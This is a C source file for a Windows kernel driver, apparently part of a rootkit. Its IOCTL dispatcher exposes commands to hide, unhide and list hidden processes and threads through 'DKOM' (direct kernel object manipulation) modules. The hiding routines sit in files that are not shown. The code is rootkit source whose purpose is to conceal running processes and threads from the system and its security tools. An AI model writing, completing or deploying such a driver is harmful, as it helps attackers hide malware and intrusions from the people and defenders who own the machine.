#include "Dispatch.h"
#include "ProcessModule.h"
#include "ThreadModule.h"
#include "Shared.h"
#include <ntddk.h>

//
// Process income connect from client
//
NTSTATUS DispatchCreate(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  UNREFERENCED_PARAMETER(DeviceObject);

  DbgPrint("Client connected.\n");

  Irp->IoStatus.Status = STATUS_SUCCESS;
  Irp->IoStatus.Information = 0;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return STATUS_SUCCESS;
}

//
// Process close connect from client
//
NTSTATUS DispatchClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  UNREFERENCED_PARAMETER(DeviceObject);

  DbgPrint("Client disconnected.\n");

  Irp->IoStatus.Status = STATUS_SUCCESS;
  Irp->IoStatus.Information = 0;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return STATUS_SUCCESS;
}

//
// Process IOCTL
//
NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  UNREFERENCED_PARAMETER(DeviceObject);

  PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
  NTSTATUS status = STATUS_SUCCESS;
  ULONG bytesReturned = 0;

  ULONG ioctlCode = stack->Parameters.DeviceIoControl.IoControlCode;
  PVOID inputBuffer = Irp->AssociatedIrp.SystemBuffer;
  PVOID outputBuffer = Irp->AssociatedIrp.SystemBuffer;
  ULONG inputLength = stack->Parameters.DeviceIoControl.InputBufferLength;
  ULONG outputLength = stack->Parameters.DeviceIoControl.OutputBufferLength;

  DbgPrint("IOCTL received: 0x%X\n", ioctlCode);

  switch (ioctlCode) {

  // ------------------------------------------------------
  // PING
  // ------------------------------------------------------
  case IOCTL_PING:
    DbgPrint("PING called\n");
    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
      response->Status = STATUS_SUCCESS;
      response->Data = 0xDEADBEEF;
      bytesReturned = sizeof(DRIVER_RESPONSE);
    } else {
      status = STATUS_BUFFER_TOO_SMALL;
    }
    break;

  // ------------------------------------------------------
  // GET_VERSION
  // ------------------------------------------------------
  case IOCTL_GET_VERSION:
    DbgPrint("GET_VERSION called\n");
    if (outputLength >= sizeof(DRIVER_RESPONSE)) {
      PDRIVER_RESPONSE response = (PDRIVER_RESPONSE)outputBuffer;
      response->Status = STATUS_SUCCESS;
      response->Data = 0x00010000;
      bytesReturned = sizeof(DRIVER_RESPONSE);
    } else {
      status = STATUS_BUFFER_TOO_SMALL;
    }
    break;

  // ------------------------------------------------------
  // Process DKOM module (see ProcessModule.c)
  // ------------------------------------------------------
  case IOCTL_HIDE_PROCESS:
    DbgPrint("HIDE_PROCESS requested.\n");
    if (inputLength == sizeof(PROCESS_REQUEST)) {
      PPROCESS_REQUEST req = (PPROCESS_REQUEST)inputBuffer;
      status = ProcessHide(req->ProcessId);
      bytesReturned = 0;
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_UNHIDE_PROCESS:
    DbgPrint("UNHIDE_PROCESS requested.\n");
    if (inputLength == sizeof(PROCESS_REQUEST)) {
      PPROCESS_REQUEST req = (PPROCESS_REQUEST)inputBuffer;
      status = ProcessUnhide(req->ProcessId);
      bytesReturned = 0;
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_LIST_HIDDEN_PROCESSES:
    DbgPrint("LIST_HIDDEN_PROCESSES requested.\n");
    if (outputLength == sizeof(PROCESS_LIST_RESPONSE)) {
      status = ProcessListHidden((PPROCESS_LIST_RESPONSE)outputBuffer);
      bytesReturned = sizeof(PROCESS_LIST_RESPONSE);
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  // ------------------------------------------------------
  // Thread DKOM module (see ProcessModule.c)
  // ------------------------------------------------------
  case IOCTL_HIDE_THREAD:
    DbgPrint("HIDE_THREAD requested.\n");
    if (inputLength == sizeof(THREAD_REQUEST)) {
      PTHREAD_REQUEST req = (PTHREAD_REQUEST)inputBuffer;
      status = ThreadHide(req->ThreadId);
      bytesReturned = 0;
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_UNHIDE_THREAD:
    DbgPrint("UNHIDE_THREAD requested.\n");
    if (inputLength == sizeof(THREAD_REQUEST)) {
      PTHREAD_REQUEST req = (PTHREAD_REQUEST)inputBuffer;
      status = ThreadUnhide(req->ThreadId);
      bytesReturned = 0;
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  case IOCTL_LIST_HIDDEN_THREADS:
    DbgPrint("LIST_HIDDEN_THREADS requested.\n");
    if (outputLength == sizeof(THREAD_LIST_RESPONSE)) {
      status = ThreadListHidden((PTHREAD_LIST_RESPONSE)outputBuffer);
      bytesReturned = sizeof(THREAD_LIST_RESPONSE);
    } else {
      status = STATUS_INVALID_BUFFER_SIZE;
    }
    break;

  default:
    DbgPrint("Unknown IOCTL: 0x%X\n", ioctlCode);
    status = STATUS_INVALID_DEVICE_REQUEST;
    break;
  }

  Irp->IoStatus.Status = status;
  Irp->IoStatus.Information = bytesReturned;
  IoCompleteRequest(Irp, IO_NO_INCREMENT);
  return status;
}